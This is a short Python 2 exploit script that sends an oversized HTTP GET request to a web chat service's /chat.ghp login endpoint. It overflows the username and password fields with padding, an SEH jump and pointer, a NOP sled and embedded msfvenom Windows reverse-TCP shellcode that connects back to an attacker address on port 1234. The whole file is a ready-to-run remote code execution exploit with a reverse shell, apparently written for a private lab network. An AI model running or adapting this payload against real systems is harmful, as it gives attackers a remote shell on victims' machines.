#!/usr/bin/python

import struct
import socket

#shellcode 
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.72.128 LPORT=1234 -b "\x00\x0a\x0b\x0d\x0f\x20\x25\x26" -f c

shell= ("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x6f\xf8\xba\xb1\x83\xee\xfc\xe2\xf4\x93\x10\x38\xb1\x6f\xf8"
"\xda\x38\x8a\xc9\x7a\xd5\xe4\xa8\x8a\x3a\x3d\xf4\x31\xe3\x7b"
"\x73\xc8\x99\x60\x4f\xf0\x97\x5e\x07\x16\x8d\x0e\x84\xb8\x9d"
"\x4f\x39\x75\xbc\x6e\x3f\x58\x43\x3d\xaf\x31\xe3\x7f\x73\xf0"
"\x8d\xe4\xb4\xab\xc9\x8c\xb0\xbb\x60\x3e\x73\xe3\x91\x6e\x2b"
"\x31\xf8\x77\x1b\x80\xf8\xe4\xcc\x31\xb0\xb9\xc9\x45\x1d\xae"
"\x37\xb7\xb0\xa8\xc0\x5a\xc4\x99\xfb\xc7\x49\x54\x85\x9e\xc4"
"\x8b\xa0\x31\xe9\x4b\xf9\x69\xd7\xe4\xf4\xf1\x3a\x37\xe4\xbb"
"\x62\xe4\xfc\x31\xb0\xbf\x71\xfe\x95\x4b\xa3\xe1\xd0\x36\xa2"
"\xeb\x4e\x8f\xa7\xe5\xeb\xe4\xea\x51\x3c\x32\x90\x89\x83\x6f"
"\xf8\xd2\xc6\x1c\xca\xe5\xe5\x07\xb4\xcd\x97\x68\x07\x6f\x09"
"\xff\xf9\xba\xb1\x46\x3c\xee\xe1\x07\xd1\x3a\xda\x6f\x07\x6f"
"\xe1\x3f\xa8\xea\xf1\x3f\xb8\xea\xd9\x85\xf7\x65\x51\x90\x2d"
"\x2d\xdb\x6a\x90\x7a\x19\x27\x78\xd2\xb3\x6f\xfc\x68\x38\x89"
"\x92\xaa\xe7\x38\x90\x23\x14\x1b\x99\x45\x64\xea\x38\xce\xbd"
"\x90\xb6\xb2\xc4\x83\x90\x4a\x04\xcd\xae\x45\x64\x07\x9b\xd7"
"\xd5\x6f\x71\x59\xe6\x38\xaf\x8b\x47\x05\xea\xe3\xe7\x8d\x05"
"\xdc\x76\x2b\xdc\x86\xb0\x6e\x75\xfe\x95\x7f\x3e\xba\xf5\x3b"
"\xa8\xec\xe7\x39\xbe\xec\xff\x39\xae\xe9\xe7\x07\x81\x76\x8e"
"\xe9\x07\x6f\x38\x8f\xb6\xec\xf7\x90\xc8\xd2\xb9\xe8\xe5\xda"
"\x4e\xba\x43\x4a\x04\xcd\xae\xd2\x17\xfa\x45\x27\x4e\xba\xc4"
"\xbc\xcd\x65\x78\x41\x51\x1a\xfd\x01\xf6\x7c\x8a\xd5\xdb\x6f"
"\xab\x45\x64")

buf = 'A' * 216 + "\xeb\x06\x90\x90" + "\xbc\x04\x01\x10" + "\x90" * 10 + shell

head  = "GET /chat.ghp?username="+buf+"&password="+buf+"&room=1 HTTP/1.1\r\n"


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.72.167',80))
s.send(head + "\r\n\r\n")
s.close()

